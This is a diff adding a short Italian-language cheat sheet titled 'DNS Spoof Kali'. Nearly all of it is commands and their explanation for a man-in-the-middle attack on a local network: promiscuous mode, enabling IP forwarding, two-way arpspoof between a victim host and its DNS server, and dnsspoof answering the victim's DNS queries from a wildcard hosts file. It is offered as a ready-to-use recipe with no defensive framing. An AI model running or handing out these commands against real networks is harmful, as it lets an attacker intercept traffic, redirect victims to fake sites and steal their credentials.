@@ -1,0 +1,21 @@
+DNS Spoof Kali
+
+Programs:
+- dnsspoof
+
+Guide:
+
++ dnsspoof -i [Interface] -f [HostsFile]				=>	dnsspoof usage
+
++ ifconfig [Interface] promisc					=>	Modalita` promiscua interfaccia
+
+Utilizzo di un file "ip url" per la risoluzione degli indirizzi. Permette di utilizzare il carattere speciale "*" per le risoluzioni:		
+x.x.x.x mail*
+x.x.x.x www*
+
++ echo 1 > /proc/sys/net/ipv4/ip_forward (enable port forwarding)
++ arpspoof -t 192.168.1.245 192.168.1.5 &;
++ arpspoof -t 192.168.1.5 192.168.1.245 &;
++ dnsspoof -f  spoofhosts.txt host  192.168.1.245  and  udp  port 53
+
+Si setta l'arp spoofing bidirezionale, ".5" il DNS,".245" l'host remoto che in questo modo utilizzera la macchina locale come default-gateway. Il comando finale ascolta il traffico destinato a ".245" e utilizza il file specificato per la risoluzione delle interrogazioni.
